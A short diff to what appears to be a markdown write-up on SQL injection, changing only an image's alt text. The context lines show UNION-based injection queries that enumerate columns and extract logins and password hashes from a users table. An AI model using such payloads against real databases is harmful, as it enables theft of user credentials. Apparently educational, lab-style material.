@@ -153,4 +153,4 @@ SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT COLUMN_NAME, 2, 3 FROM i
 SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT uLogin, uHash, uType FROM users); --%''
 ```
 
-![alt text](/assets/sql_injected_products_table.png "SQL_Injected_Products_Table")
+![SQL_Injected_Products_Table](/assets/sql_injected_products_table.png)
